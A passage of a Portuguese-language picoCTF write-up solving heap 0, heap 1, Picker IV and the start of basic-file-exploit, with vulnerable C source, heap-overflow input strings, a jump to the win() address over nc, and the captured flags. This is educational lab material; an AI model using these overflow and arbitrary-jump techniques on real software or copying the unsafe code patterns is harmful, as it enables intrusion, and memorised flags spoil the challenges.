</span></span></code></pre></td></tr></table></div></div><p>Para vencer, precisamos fazer com que a comparação<br><code>if (strcmp(safe_var, "bico") != 0)</code> funcione. Isso significa que <code>safe_var</code> precisa ser diferente de <code>"bico"</code>.</p><p><code>safe_var</code> é definido globalmente, mas o usamos na função <code>init()</code> para torná-lo uma string com <code>"bico"</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>safe_var</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>SAFE_VAR_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>strncpy</span><span class=p>(</span><span class=n>safe_var</span><span class=p>,</span> <span class=s>&#34;bico&#34;</span><span class=p>,</span> <span class=n>SAFE_VAR_SIZE</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Quando usamos a função <code>write_buffer()</code>, fazemos um <code>scanf</code> de uma string e a inserimos na variável <code>input_data</code>. Se você prestar atenção, <code>input_data</code> e <code>safe_var</code> são alocados com <code>malloc</code> uma após a outra, o que significa que provavelmente também estão localizados sequencialmente (ou bem próximos um do outro) na memória. O <code>print_heap()</code> confirma isso quando o executamos:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Heap State:
</span></span><span class=line><span class=cl>+-------------+----------------+
</span></span><span class=line><span class=cl>[*] Address   -&gt;   Heap Data
</span></span><span class=line><span class=cl>+-------------+----------------+
</span></span><span class=line><span class=cl>[*]   0x55bc1d8756b0  -&gt;   pico
</span></span><span class=line><span class=cl>+-------------+----------------+
</span></span><span class=line><span class=cl>[*]   0x55bc1d8756d0  -&gt;   bico
</span></span><span class=line><span class=cl>+-------------+----------------+
</span></span></code></pre></td></tr></table></div></div><p><code>pico</code> está no endereço <code>0x557a2f2bd6b0</code> e <code>bico</code> está no endereço <code>0x557a2f2bd6d0</code>. Isso é uma distância de 32 bytes. Se escrevermos em <code>input_data</code> com 32 bytes + <em>algo mais</em>, esse <em>algo mais</em> será escrito na variável <code>safe_var</code>.</p><p>Você pode escrever a seguinte entrada na função <code>write_buffer</code>:<br><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnoop</code></p><p>Depois disso, você pode verificar usando <code>print_heap()</code> que realmente mudamos <code>safe_var</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Enter your choice: 1
</span></span><span class=line><span class=cl>Heap State:
</span></span><span class=line><span class=cl>+-------------+----------------+
</span></span><span class=line><span class=cl>[*] Address   -&gt;   Heap Data
</span></span><span class=line><span class=cl>+-------------+----------------+
</span></span><span class=line><span class=cl>[*]   0x55bc1d8756b0  -&gt;   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnoop
</span></span><span class=line><span class=cl>+-------------+----------------+
</span></span><span class=line><span class=cl>[*]   0x55bc1d8756d0  -&gt;   noop
</span></span><span class=line><span class=cl>+-------------+----------------+
</span></span></code></pre></td></tr></table></div></div><p>Podemos então apenas imprimir a flag.</p><p>flag: <code>picoCTF{my_first_heap_overflow_76775c7c}</code></p><h2 id=heap-1>heap 1<a hidden class=anchor aria-hidden=true href=#heap-1>#</a></h2><p>No heap 1, temos quase o mesmo código de heap 0. No entanto, a comparação usada para pegar a flag é diferente. Aqui está como é feita em heap 1:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>safe_var</span><span class=p>,</span> <span class=s>&#34;pico&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>A única diferença aqui é que agora queremos que <code>safe_var</code> seja <code>"pico"</code>.</p><p>Na solução anterior, alteramos <code>safe_var</code> para <code>noop</code>. Podemos usar a mesma solução, mas alterando para <code>"pico"</code>:</p><p>Entrada para a função write_buffer:
<code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico</code></p><p>flag: <code>picoCTF{starting_to_get_the_hang_e9fbcea5}</code></p><h2 id=picker-iv>Picker IV<a hidden class=anchor aria-hidden=true href=#picker-iv>#</a></h2><p>Source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>print_segf_message</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Segfault triggered! Exiting.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>sleep</span><span class=p>(</span><span class=mi>15</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>exit</span><span class=p>(</span><span class=n>SIGSEGV</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>win</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>FILE</span> <span class=o>*</span><span class=n>fptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;You won!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Open file
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>fptr</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>fptr</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Cannot open file.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// Read contents from file
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>c</span> <span class=o>=</span> <span class=nf>fgetc</span><span class=p>(</span><span class=n>fptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=n>c</span> <span class=o>!=</span> <span class=n>EOF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span> <span class=p>(</span><span class=s>&#34;%c&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>c</span> <span class=o>=</span> <span class=nf>fgetc</span><span class=p>(</span><span class=n>fptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fclose</span><span class=p>(</span><span class=n>fptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>signal</span><span class=p>(</span><span class=n>SIGSEGV</span><span class=p>,</span> <span class=n>print_segf_message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span> <span class=c1>// _IONBF = Unbuffered
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Enter the address in hex to jump to, excluding &#39;0x&#39;: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%x&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;You input 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>foo</span><span class=p>)(</span><span class=kt>void</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>foo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>checksec:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE (0x400000)
</span></span></code></pre></td></tr></table></div></div><p>Parece que o código solicitará um endereço em hexadecimal e saltará para ele. Como não temos PIE, podemos simplesmente escolher o endereço sem preocupações. Usei o gdb para obter o endereço da função <code>win</code>: <code>0x40129e</code>.</p><p>O <code>scanf</code> lerá um valor hexadecimal, então fiz o seguinte:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nc saturn.picoctf.net 59045
</span></span><span class=line><span class=cl>Enter the address in hex to jump to, excluding &#39;0x&#39;: 40129e
</span></span><span class=line><span class=cl>You input 0x40129e
</span></span><span class=line><span class=cl>You won!
</span></span><span class=line><span class=cl>picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}
</span></span></code></pre></td></tr></table></div></div><p>flag: <code>picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}</code></p><h2 id=basic-file-exploit>basic-file-exploit<a hidden class=anchor aria-hidden=true href=#basic-file-exploit>#</a></h2><p>O source code é meio longo, mas aqui está ele:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdbool.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;ctype.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/time.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define WAIT 60
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>flag</span> <span class=o>=</span> <span class=s>&#34;[REDACTED]&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>char</span> <span class=n>data</span><span class=p>[</span><span class=mi>10</span><span class=p>][</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=n>input_lengths</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=n>inputs</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>tgetinput</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>input</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>l</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>fd_set</span>          <span class=n>input_set</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>timeval</span>  <span class=n>timeout</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span>             <span class=n>ready_for_reading</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span>             <span class=n>read_bytes</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span> <span class=n>l</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;&#39;l&#39; for tgetinput must be greater than 0</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=o>-</span><span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* Empty the FD Set */</span>
</span></span><span class=line><span class=cl>    <span class=nf>FD_ZERO</span><span class=p>(</span><span class=o>&amp;</span><span class=n>input_set</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Listen to the input descriptor */</span>
</span></span><span class=line><span class=cl>    <span class=nf>FD_SET</span><span class=p>(</span><span class=n>STDIN_FILENO</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input_set</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* Waiting for some seconds */</span>
</span></span><span class=line><span class=cl>    <span class=n>timeout</span><span class=p>.</span><span class=n>tv_sec</span> <span class=o>=</span> <span class=n>WAIT</span><span class=p>;</span>    <span class=c1>// WAIT seconds
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>timeout</span><span class=p>.</span><span class=n>tv_usec</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>    <span class=c1>// 0 milliseconds
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Listening for input stream for any activity */</span>
</span></span><span class=line><span class=cl>    <span class=n>ready_for_reading</span> <span class=o>=</span> <span class=nf>select</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input_set</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>timeout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Here, first parameter is number of FDs in the set,
</span></span></span><span class=line><span class=cl><span class=cm>     * second is our FD set for reading,
</span></span></span><span class=line><span class=cl><span class=cm>     * third is the FD set in which any write activity needs to updated,
</span></span></span><span class=line><span class=cl><span class=cm>     * which is not required in this case.
</span></span></span><span class=line><span class=cl><span class=cm>     * Fourth is timeout
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>ready_for_reading</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=cm>/* Some error has occured in input */</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Unable to read your input</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>ready_for_reading</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>read_bytes</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>input</span><span class=p>,</span> <span class=n>l</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=n>read_bytes</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>==</span><span class=sc>&#39;\n&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=o>--</span><span class=n>read_bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>input</span><span class=p>[</span><span class=n>read_bytes</span><span class=p>]</span><span class=o>=</span><span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>read_bytes</span><span class=o>==</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;No data given.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=o>-</span><span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Timed out waiting for user input. Press Ctrl-C to disconnect</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>data_write</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>input</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>len</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>long</span> <span class=n>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Please enter your data:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>r</span> <span class=o>=</span> <span class=nf>tgetinput</span><span class=p>(</span><span class=n>input</span><span class=p>,</span> <span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Timeout on user input
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span><span class=p>(</span><span class=n>r</span> <span class=o>==</span> <span class=o>-</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Goodbye!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
